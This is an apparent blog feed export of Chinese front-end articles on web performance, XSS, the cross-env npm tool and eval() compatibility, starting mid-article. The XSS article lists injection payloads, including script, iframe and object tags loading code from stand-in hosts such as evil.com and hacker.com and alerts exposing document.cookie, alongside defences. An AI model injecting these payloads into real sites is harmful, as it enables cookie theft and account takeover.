<p><img src="https://upload-images.jianshu.io/upload_images/10024246-a6459d697485c351.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
<p>由此我们可以得出结论：<strong>一个http请求绝大多数的时间消耗在了建立连接跟等待的时间，优化的方法是减少http请求</strong>。</p>
<p><strong>如何提高web性能？</strong></p>
<p><strong>1、减少HTTP请求</strong></p>
<p>一般来说要减少http请求通常从两个方面下手：减少图片的请求、减少脚本文件与样式表的请求</p>
<p>图片的减少通常有两种方式：<strong>css sprites、内联图片、IconFont</strong></p>
<p><strong>CSS Sprites：</strong>将多张图片合并成一幅单独的图片，使用css的<code>background-position</code>属性，将html元素的背景图片放到<code>sprites</code> 图片中的期望位置上。使用这项技术的附加优点是他降低了下载量，合并后的图片比分离的图片和更小，因为它降低了图片自身的开销（颜色表、格式信息等等）。实际项目中<code>css sprites</code>是一项体力活，因为开发过程中需要对这张大图进行维护（添加、减少图片），张鑫旭同学的文章中有介绍如何管理sprites图片可以作为参考（**<a href="http://www.zhangxinxu.com/wordpress/2010/07/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E5%AF%B9%E7%BD%91%E7%AB%99css%E8%BF%9B%E8%A1%8C%E6%9E%B6%E6%9E%84%E7%9A%84/">这里</a>**）。如果需要在页面中为背景、链接、导航栏提供大量的图片，css sprites绝对是一种优秀的解决方案（干净的标签、较少的图片、较短的响应时间）。</p>
<p><strong>内联图片：</strong>通过使用<code>data:URL</code>模式可以再页面中包含图片而无需任何额外的请求。缺点就是IE8以下的浏览器不支持这种方式，而IE8在数据大小上有限制，只能支持23kb以内的数据。对于较小的图片来说可以直接内联到web页面中，但对于大图片内联到页面里会导致页面变大，聪明的做法是使用css，将内联的图片作为背景使用，并放到外部样式表中，这意味着数据可以缓存在样式表内部。使用外部样式表虽然增加了一个http请求，但样式可以被浏览器缓存，得到额外的收获。另外一点需要注意：base64是有损压缩。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-1529134452b007f9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
<p><strong>IconFont：</strong>图标字体，这是近年来新流行的一种以字体代替图片的技术。它可以适应任何分辨率而不会出现图片模糊问题，与图片相比它具有更小的容量，更高的灵活性（像字体一样可以设置图标大小、颜色、透明度、hover状态、反转等），IE8以上的浏览器都支持该技术。在使用IconFont之前，你首先要确定你选则的字体库是否是收费。详细内容可以参考这篇文章：图标字体化浅谈（<strong>isux.tencent.com/icon-font.html</strong>）</p>
<p>减少脚本与样式表的请求主要原则就是合并。在实际开发中我们遵循模块化的原则将代码分散到许多小文件中，按照软件开发的原则这是完全正确的，但对于上线页面来说，每一个文件都会产生一个http请求，严重影响性能。和<code>css sprites</code>一样，将这些小文件合并到一个文件中，可以减少http请求的数量并缩短最终用户响应时间。在合并过程中我们还需要使用工具精简（移除不必要的字符以减小文件大小缩减下载时间）和混淆（除了移除不必要字符外，还会改写源代码，比如函数和变量名使用更短的标量名）Javascript代码。对于采用AMD或CMD进行模块化开发的同学，在合并过程中通常会将依赖的其他模块打包到一个文件中，而模板html通常以字符串的方式内联到Javascript文件中。目前最常用的前端构建工具就是glup，这里有一篇初步应用的文章：<strong>前端 | gulp 打包 require.js 模块依赖：segmentfault.com/a/1190000002876583</strong></p>
<p><strong>2、页面内部优化</strong></p>
<p>关于页面内部优化主要方向：样式表放在顶部、脚本文件放在底部、避免css表达式、把脚本的样式表放在外部、移除重复脚本。</p>
<p>关心性能的工程师都希望页面能否尽快的展现在用户面前，对于页面中很多内容的页面我们都希望内容能够逐步加载，为用户提供可视化回馈。而将样式表放在底部会导致浏览器阻止内容逐步呈现。为避免当页面变化时重绘页面元素，浏览器会阻塞页面呈现，直到样式表解析完毕。所以如果将样式表放在顶部并不会减少资源的加载时间，它减少的是页面的呈现时间。小米主页曾经犯过这样的错误：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-403007190406e364.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
<p>将样式表放在底部会阻塞页面的逐步呈现，而将script文件放在页面顶部同样会阻塞页面的逐步呈现。script元素会阻塞后续内容的解析，因为script中可以同过<code>document.write</code>来更改页面。解决的办法就是将script标签放在页面底部。这样既可以让内容逐步呈现，也可以提高下载的并行度。如果我们确定不需要<code>document.write</code>那可以为<code>script</code>标签加上<code>asyn</code>属性（Ie中要加上<code>defer</code>）提高并行下载度。</p>
<p>CSS表达式是ie支持的可以用来动态更改css属性的一种方式，我们不需要了解太多，她的书写方式如下，一旦在产品中发现<code>expression</code>关键字就要彻底消灭。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-8b343d87b3131508.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
<p>使用外部脚本和样式这一条，我想凡是有点经验的工程师都会这么干。</p>
<p><strong>移除重复脚本：</strong>这条说的主要是避免在页面中多次加入同一份Javascript代码，如果我们的开发中有依赖管理的方式比如AMD、CMD，基本不会出现这种情况。</p>
<p><strong>3、启用缓存</strong></p>
<p>关于缓存的使用这里介绍两套方案：<code>expires/If-Modified-Since</code>、<code>Cache-Control/Etag</code>；前者是HTTP1.0中的缓存方案，后者是HTTP1.1中缓存方案，若http头部中同时出现二者，后者的优先级更高。</p>
<p><code>If-modified-since</code>的方式通常被称为条件Get。浏览器缓存中保存了一个文件的副本，但需要向服务器询问此副本是否可用。If-<code>Modified-Since</code>是浏览器将最后修改时间发送给服务器，服务器相应头中<code>Last-Modified</code>进行对比；若<code>If-Modified-Since &lt;= Last-Modified</code> 则浏览器读取本地副本。此时响应状态为<code>304 Not Modified</code>, 并不在发送响应体。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-097f40bfddb7254f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
<p><strong>Expries：</strong>虽然使用条件GET和304响应能够节省时间，但浏览器跟服务器端仍然要发送一次请求进行确认。通过明确设置副本的过期时间可以避免条件GET。当浏览器发现响应头中的expires时，会将过期时间和文件一起保存到缓存中去。在过期之前一直从缓存中读取。expires头使用一个特定的时间来指定缓存的有效期，他要求浏览器与服务器时间完全一致。而且一旦过期，服务器端配置中需要重新设顶一个过期时间。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-ff24306e0e0d8654.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
<p><strong>ETag（实体标签）：</strong>是服务器用于检查浏览器缓存有效性的一种机制。ETag在HTTP1.1中引入，ETag是唯一标识了一个组件的一个特定版本的字符串。唯一的格式约束是这个字符串必须使用双引号。如果浏览器要验证一个组件是否有效他会使用<code>If-None-Match</code>将etag字符串传送给服务器。如果ETag是匹配的，服务器端会返回304.（如果实体数据需要根据<code>User-Agent</code>或<code>Accept-Language</code>来改变时，ETag提供了更高的灵活性）。对于使用服务器集群的网站来说，从一台服务器到另一台服务器，ETag通常是无法匹配的。这是ETag的问题。而且即便同时使用<code>If-Modified-Since</code>和<code>If-None-Match</code>也并不能达到预期效果。解决方法总是有的：<strong>自定义Etag格式</strong></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d897481f20db04c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
<p><strong>Cache-Control：</strong> HTTP1.1引入了来代替Expires，它使用<code>max-age</code>指令来指定副本被缓存多久，该指令以秒为单位定义了一个更新窗，组件从被请求开始到现在的秒数小于设定值，则一直使用副本。避免了一次http请求。相比Expries，<code>Cache-Control</code>指令提供了更细粒度的控制。详细内容请看大额同学的文章：<strong>透过浏览器看HTTP缓存 （cnblogs.com/skylar/p/browser-http-caching.html）</strong></p>
<p><strong>4、减少下载量</strong></p>
<p>减少下载量最有效的方式就是开启gzip压缩，gzip是GNU开发的一种免费格式。压缩组件通过减小http响应的大小来加快响应速度。HTTP1.1通过使用Accept-Encoding来标识支持的压缩，如果服务器看到这个标识，会使用请求头中的一种方式来压缩响应。并通过Content-Encoding来通知web客户端。很多网站会压缩html文件，实际上包括xml跟json在内的任何文本都可以压缩，但图片和pdf不应该压缩。根据经验通常可以对大于1kb或2kb的文件进行压缩。压缩通常能将响应的数据量减少70%。压缩的成本在于：服务器需要耗费额外的cpu进行压缩，客户端需要解压缩。所以需要在cpu的消耗和数据块的大小之间进行取舍。</p>
<p><strong>5、优化网络连接</strong></p>
<p>网络连接的优化主要有三个规则：使用CDN加速、减少DNS查找、避免重定向。</p>
<p><strong>CDN：</strong> CDN是地理上分布的web server的集合，用于更高效地发布内容。通常基于网络远近来选择给具体用户服务的web server。这缩短了资源的传输响应时间，有效提高web性能。</p>
<p>DNS用于映射主机名和IP地址，一般一次解析需要20～120毫秒。浏览器会首先根据页面的主机名进行域名解析，在有ISP返回结果之前页面不会加载任何内容，所以减少DNS查找可以有效降低等待时间。为达到更高的性能，DNS解析通常被多级别地缓存，如由ISP或局域网维护的caching server，本地机器操作系统的缓存（如windows上的DNS Client Service），浏览器。IE的缺省DNS缓存时间为30分钟，Firefox的缺省缓冲时间是1分钟。我们能做的是尽量减少一个页面的主机名，但要在浏览器最大并行下载数跟dns查找之间做权衡。根据雅虎的研究，最好将主机名控制在2-4个内。</p>
<p><strong>重定向：</strong>将一个URL重新路由到另一个URL。重定向功能是通过301和302这两个HTTP状态码完成的，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently </span><br><span class="line">Location: http:&#x2F;&#x2F;example.com&#x2F;newuri </span><br><span class="line">Content-Type: text&#x2F;html </span><br></pre></td></tr></table></figure>

<p>浏览器自动重定向请求到Location指定的URL上，重定向的主要问题是降低了用户体验。种最耗费资源、经常发生而很容易被忽视的重定向是URL的最后缺少<code>/</code>，导致自动产生结尾斜线的原因是，浏览器在进行<code>get</code>请求是必须指定一些路径；如果没有路径它就会简单的使用文档根。（主机缺少结尾斜线是不会发生重定向：<code>http://www.baidu.com</code>）缺少结尾斜线发生重定向是很多web服务器的默认行为。需要在服务器端设置方可消除。以下图片是豆瓣的一个url请求：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-01bec0dc2946afaa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
<p>雅虎的14条优化规则在很长的一段时间里发挥着重要作用，随着技术的发展，单单这十四条原则已经不能够满足前端性能优化。在一些大公司出现了前端工程化这一概念，详细内容可以参考一下这篇文章：<strong>前端性能优化工程化进阶（trock.lofter.com/post/117023_19bb9bb）</strong></p>
<blockquote>
<p>文章源自：cnblogs.com/dojo-lzz/p/4591446.html</p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>XSS(跨站脚本)漏洞及解决</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/XSS(%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC)%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<h2 id="xss是什么"><a href="#xss是什么" class="headerlink" title="xss是什么"></a>xss是什么</h2><p>xss跨站脚本攻击(Cross Site Scripting)，是一种经常出现在web应用中的计算机安全漏洞，它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入的恶意html代码会被执行，从而达到恶意用户的特殊目的。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-d5e55ef5a0ced4ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><strong>本质：</strong>浏览器把输入数据插<code>入页面</code>中，当成<code>脚本执行</code>;<br><strong>XSS分为：</strong></p>
<ul>
<li>存储型 <pre><code>存储区域在后端数据库，插入点在HTML
</code></pre>
</li>
<li>反射型<br>存储区域在URL，插入点在HTML</li>
<li>DOM型XSS<br>存储区域在数据库、前端存储、URL都可能发生；插入点在javascript<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2></li>
<li>1、攻击者构造出特殊的 URL，其中包含恶意代码。 </li>
<li>2、攻击者诱使用户点击链接，恶意代码被拼接到 HTML 中返回给浏览<br>器。 </li>
<li>3、浏览器解析执行。</li>
<li>4、恶意代码窃取用户数据并发送到攻击者的网站。攻击者冒充用户的行 为，调用目标网站接口执行攻击者指定的操作。</li>
</ul>
<blockquote>
<p>常⻅于用户登陆、数据搜索等位置</p>
</blockquote>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><ul>
<li>1、攻击者构造恶意代码，并提交保存到数据库。 </li>
<li>2、用户打开应用，从数据库读取恶意代码，拼接到 HTML 中返回给浏览<br>器。</li>
<li>3、浏览器解析执行。</li>
<li>4、恶意代码窃取用户数据并发送到攻击者的网站。攻击者冒充用户的行 为，调用目标网站接口执行攻击者指定的操作。<blockquote>
<p>常⻅于如论坛发帖、商品评论、用户信息修改等</p>
</blockquote>
</li>
</ul>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><ul>
<li>1、攻击者构造出特殊的 URL，其中包含恶意代码。</li>
<li>2、攻击者诱使用户点击链接。 </li>
<li>3、浏览器解析执行，前端取出 URL 中的恶意代码并执行。</li>
<li>4、恶意代码窃取用户数据并发送到攻击者的网站。攻击者冒充用户的行 为，调&gt;用目标网站接口执行攻击者指定的操作。<h2 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h2></li>
<li><script>标签：<script>标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;xxx.com&#x2F;xss.js&gt;&lt;&#x2F;script&gt;  #引用外部的xss</span><br><span class="line">&lt;script&gt; alert(&quot;hack&quot;)&lt;&#x2F;script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt; #弹出cookie</span><br></pre></td></tr></table></figure>
<img>标签：
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(&#x2F;hack&#x2F;)&gt;</span><br><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(document.cookie)&gt;  #弹出cookie</span><br><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(123)&gt;      注：对于数字，可以不用引号</span><br><span class="line">&lt;img  src&#x3D;&quot;javascript:alert(&quot;XSS&quot;);&quot;&gt;</span><br><span class="line">&lt;img  dynsrc&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br><span class="line">&lt;img  lowsrc&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure></li>
<li><body>标签：可以使用onload属性或其他更加模糊的属性（如属性）在标记内部传递XSS有效内容background
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body onload&#x3D;alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&lt;body background&#x3D;&quot;javascript:alert(&quot;XSS&quot;)&quot;&gt;</span><br></pre></td></tr></table></figure></li>
<li><iframe>标签：该<iframe>标签允许另一个HTML网页的嵌入到父页面。
`IFrame可以包含JavaScript，但是，请注意，由于浏览器的内容安全策略（CSP），iFrame中的JavaScript无法访问父页面的DOM。然而，IFrame仍然是非常有效的解除网络钓鱼攻击的手段`
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe src&#x3D;”http:&#x2F;&#x2F;evil.com&#x2F;xss.html”&gt;</span><br></pre></td></tr></table></figure></li>
<li><input>标签：在某些浏览器中，如果标记的type属性<input>设置为image，则可以对其进行操作以嵌入脚本<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;image&quot; src&#x3D;&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure></li>
<li><link>标签：<link>标签，这是经常被用来连接外部的样式表可以包含的脚本
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure></li>
<li><table>标签：可以利用和标签的background属性来引用脚本而不是图像
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;table background&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br><span class="line"> </span><br><span class="line">&lt;td background&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure></li>
<li><div>标签：该<div>标签，类似于<table>和<td>标签也可以指定一个背景，因此嵌入的脚本。
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</span><br><span class="line"> </span><br><span class="line">&lt;div style&#x3D;&quot;width: expression(alert(&#39;XSS&#39;));&quot;&gt;</span><br></pre></td></tr></table></figure></li>
<li><object>标签：该<object>标签可用于从外部站点脚本包含<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;object type&#x3D;&quot;text&#x2F;x-scriptlet&quot; data&#x3D;&quot;http:&#x2F;&#x2F;hacker.com&#x2F;xss.html&quot;&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
<li>利用模板引擎<br>模板引擎一般自带转义，需尽量保持最新，避免低版本漏洞</li>
<li>避免内联事件<br>尽量不要用onLoad=“onload(‘’)”<br>onClick=“go(‘’)” 这种写法</li>
<li>避免拼接 HTML<br>使用成熟的渲染框架，并保持新版本+后端过滤，如vue，angular等<br>使用成熟的过滤器，并保持新版本，如ESAPI，Dompurify等</li>
<li>增加攻击难度，降低攻击后果<br>严格白名单、规范的CSP、限制⻓度、http-only等</li>
</ul>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>npm常用模块之cross-env使用</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/cross-env/</url>
    <content><![CDATA[<p><strong>cross-env</strong>这是一款运行跨平台设置和使用环境变量的脚本。</p>
<p><strong>为什么需要cross-env?</strong></p>
<p><code>NODE_ENV=production</code>像这样设置环境变量时，大多数Windows命令提示符都会阻塞 。（<code>Windows</code>上的<code>Bash</code>是例外，它使用本机Bash。）同样，Windows和POSIX命令使用环境变量的方式也有所不同。对于POSIX，您可以使用：<code>$ENV_VAR</code> 和在Windows上可以使用<code>%ENV_VAR%</code>。<br><code>cross-env</code>这样，您就可以使用单个命令，而不必担心为平台正确设置或使用环境变量。就像在POSIX系统上运行时一样，只需对其进行设置即可，并且<code>cross-env</code>会妥善设置。</p>
<p>在window下配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#node中常用的到的环境变量是NODE_ENV，首先查看是否存在 </span><br><span class="line">set NODE_ENV </span><br><span class="line"></span><br><span class="line">#如果不存在则添加环境变量 </span><br><span class="line">set NODE_ENV&#x3D;production </span><br><span class="line"></span><br><span class="line">#环境变量追加值 set 变量名&#x3D;%变量名%;变量内容 </span><br><span class="line">set path&#x3D;%path%;C:\web;C:\Tools </span><br><span class="line"></span><br><span class="line">#某些时候需要删除环境变量 </span><br><span class="line">set NODE_ENV&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在linux下配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#node中常用的到的环境变量是NODE_ENV，首先查看是否存在</span><br><span class="line">echo $NODE_ENV</span><br><span class="line"></span><br><span class="line">#如果不存在则添加环境变量</span><br><span class="line">export NODE_ENV&#x3D;production</span><br><span class="line"></span><br><span class="line">#环境变量追加值</span><br><span class="line">export path&#x3D;$path:&#x2F;home&#x2F;download:&#x2F;usr&#x2F;local&#x2F;</span><br><span class="line"></span><br><span class="line">#某些时候需要删除环境变量</span><br><span class="line">unset NODE_ENV</span><br><span class="line"></span><br><span class="line">#某些时候需要显示所有的环境变量</span><br><span class="line">env</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://www.npmjs.com/package/cross-env">更多使用文档请点击访问cross-env工具官网</a>。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>一键安装不多解释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save-dev cross-env</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>警告！确保在安装软件包时可以正确拼写，以免错误安装恶意软件</p>
</blockquote>
<blockquote>
<p>注意：cross-env的版本6仅支持Node.js 8和更高版本，才能在Node.js 7或更低版​​本的安装版本5上使用<code>npm install --save-dev cross-env@5</code></p>
</blockquote>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>我在npm脚本中使用了它：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;build&quot;: &quot;cross-env NODE_ENV&#x3D;production webpack --config build&#x2F;webpack.config.js&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最终，执行的命令（使用<a href="https://www.npmjs.com/package/cross-spawn">cross-spawn</a>）为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">webpack --config build&#x2F;webpack.config.js</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>该<code>NODE_ENV</code>环境变量将被设置<code>cross-env</code></p>
<p>您也可以将命令拆分为多个命令，或者将环境变量声明与实际命令执行分开。您可以这样操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;parentScript&quot;: &quot;cross-env GREET&#x3D;\&quot;Joe\&quot; npm run childScript&quot;,</span><br><span class="line">    &quot;childScript&quot;: &quot;cross-env-shell \&quot;echo Hello $GREET\&quot;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中<code>childScript</code>包含要执行的实际命令并<code>parentScript</code>设置要使用的环境变量。然后，而不是运行<code>childScript</code>，而是运行父项。这对于使用不同的env变量启动同一命令或当环境变量太长而无法将所有内容放在一行中时非常有用。这也意味着<code>$GREET</code>即使在通常要求使用Windows的Windows上，也可以使用<code>env var</code>语法<code>%GREET%</code>。</p>
<p>如果您在美元符号前加上奇数个反斜杠，则不会替换表达式语句。请注意，这意味着在转义JSON字符串后使用了反斜杠。<code>&quot;FOO=\\$BAR&quot;</code>将不会被替换。 <code>&quot;FOO=\\\\$BAR&quot;</code>虽然会被替换。</p>
<p>最后，如果要传递JSON字符串（例如，使用<code>ts-loader</code>时），则可以执行以下操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;test&quot;: &quot;cross-env TS_NODE_COMPILER_OPTIONS&#x3D;&#123;\\\&quot;module\\\&quot;:\\\&quot;commonjs\\\&quot;&#125; node some_file.test.ts&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>要特别注意三倍反斜线<code>(\\\)</code>之前的 双引号<code>(&quot;)</code>和缺少的单引号<code>(&#39;)</code>。为了同时在Windows和UNIX上运行，必须同时满足这两个条件。</p>
<p><code>cross-env</code> 与 <code>cross-env-shell</code><br>该<code>cross-env</code>模块公开了两个容器：<code>cross-env</code>和<code>cross-env-shell</code>。第一个使用来执行命令<a href="https://www.npmjs.com/package/cross-spawn">cross-spawn</a>，第二个使用<code>shellNode</code>的选项<code>spawn</code>。</p>
<p>主要用例<code>cross-env-shell</code>是当您需要在整个嵌入式命令行脚本中而不是仅在一个命令中设置环境变量时。</p>
<p>例如，如果您希望将环境变量应用于一系列串联的命令，则需要将其用引号引起来并使用 <code>cross-env-shell</code>代替<code>cross-env</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;greet&quot;: &quot;cross-env-shell GREETING&#x3D;Hi NAME&#x3D;Joe \&quot;echo $GREETING &amp;&amp; echo $NAME\&quot;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经验法则是：如果要传递给<code>cross-env</code>包含要解释的特殊<code>Shell</code>字符的命令，请使用 <code>cross-env-shell</code>。否则请坚持<code>cross-env</code>。</p>
<p>在Windows上<code>cross-env-shell</code>，如果要 在程序内部处理<a href="https://nodejs.org/api/process.html#process_signal_events">信号事件</a>，则 需要使用。常见的情况是当您想要捕获<code>SIGINT</code>通过<code>Ctrl + C</code>在命令行界面上按调用的 事件时。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>eval()的运用和兼容性问题</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/eval()%E7%9A%84%E8%BF%90%E7%94%A8%E5%92%8C%E5%85%BC%E5%AE%B9%E6%80%A7%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="eval-的运用"><a href="#eval-的运用" class="headerlink" title="eval()的运用"></a>eval()的运用</h2><p>eval() 函数可将字符串转换为代码实行，并返回一个或多个值</p>
<p>eval调用时，实例为eval( “( javascript代码 )” )</p>
<p>eval()的返回值</p>
<p>eval()的返回值遵照以下划定规矩：</p>
<ol>
<li> 假如eval()的参数不是字符串，那末eval()将直接返回参数。</li>
<li> 假如eval()的参数是字符串，那末eval()将这个字符串剖析成代码后举行实行，并返回末了一行代码实行的效果。</li>
<li> 假如字符串没法剖析成正当的代码，eval()将抛出SyntaxError毛病。</li>
</ol>
<p>举例1（eval的参数不是字符串）：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-dc4d5e8e42bc6faf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>运转效果（谷歌浏览器测试）：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-70af05064badec1d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>举例2（eval的参数是字符串）：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-84320fcb1e2c83b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>运转效果（谷歌浏览器测试）：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-591d433602ba4377.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>固然，假如不运用eval()要领，上面的代码能够运用匿名函数写<br><img src="https://upload-images.jianshu.io/upload_images/10024246-6d61d72a83601c84.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>举例3（字符串没法剖析成正当的代码）：<br>[图片上传失败…(image-e61579-1612431403324)] </p>
<p>运转效果（谷歌浏览器测试）：此时能够看到 谷歌浏览器控制台报错<br><img src="https://upload-images.jianshu.io/upload_images/10024246-70b8a87576a7ba81.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="eval-的兼容性问题"><a href="#eval-的兼容性问题" class="headerlink" title="eval()的兼容性问题"></a>eval()的兼容性问题</h2><p>IE6/7/8不兼容</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-22edc1da1eb8e7f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>运用IE8来测试代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str &#x3D; &quot;function()&#123;alert(&#39;Test eval&#39;)&#125;&quot;;</span><br><span class="line">var fn &#x3D; eval(&quot;(&quot; + str + &quot;)&quot;);</span><br><span class="line">fn();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>没有弹出框，控制台报错：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-d1ba5b9f2702b160.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>解决要领：</p>
<p>a)var s = “function(){alert(‘Test!’)}”;</p>
<p>b)var s = “0?0:function(){alert(‘Test!’)}”;<br>固然这个解决要领是从外洋论坛内里找到(网站：<a href="http://stackoverflow.com/questions/6807649/problems-with-ie9-javascript-eval">http://stackoverflow.com/ques…</a>)<br>[图片上传失败…(image-ee8f60-1612431403324)] </p>
<p>粗心是：这在JScript诠释器内里是一个bug，它不会出如今IE9除非你运用混淆形式或兼容来看。IE8毛病将这个函数表达式诠释为函数的声明，使得它没有任何的返回值。所以你能够写成其他比较典范的表达式，从从而在JScript诠释器中组成一个表达式。</p>
<p>那末我们就晓得IE6/7/8运用JScrip诠释器来剖析eval()把参数当初函数声明，没有返回值，所以我么能够把eval()函数内里的字符串代码写成一个表达式，即能够写成：</p>
<p>function(){alert(‘Test!’)} 或 0?0:function(){alert(‘Test!’)}<br>改代码：</p>
